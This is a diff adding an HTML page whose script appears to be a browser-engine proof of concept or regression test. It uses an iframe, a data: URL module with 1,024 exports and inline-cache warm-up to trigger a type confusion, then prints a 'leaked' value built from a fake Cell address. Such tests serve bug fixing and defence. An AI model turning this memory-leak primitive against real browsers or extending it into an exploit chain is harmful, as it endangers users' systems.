@@ -1,0 +1,35 @@
+<body>
+<script>
+const PROP_COUNT = 2 ** 10; // Controls the fake Cell address.
+const IC_WARMUP_COUNT = 10;
+
+if (top == window) {
+  function generateModuleUrl() {
+    let url = "data:text/javascript,export let ";
+    for (let i = 0; i < PROP_COUNT; ++i)
+      url += (i ? "," : "") + `p${i}`;
+    return url;
+  }
+
+  let frame = document.createElement("iframe");
+  frame.src = location; // Must be set before attaching the frame.
+  document.body.appendChild(frame);
+
+  let child_window = frame.contentWindow;
+  // The `chrome` object must be from the same context as the `window` object.
+  queueMicrotask(_ => child_window.eval("import(top.generateModuleUrl())")
+    .then(module => {
+      child_window.chrome = module;
+      child_window.onload = () => {
+        frame.remove(); // prevents `app` from being reconfigured as a data property.
+
+        function accessIC() { return module.app; }
+        for (let i = 0; i < IC_WARMUP_COUNT; ++i)
+          accessIC();
+
+        document.body.textContent = "leaked: " + accessIC();
+      }
+    }));
+}
+</script>
+</body>
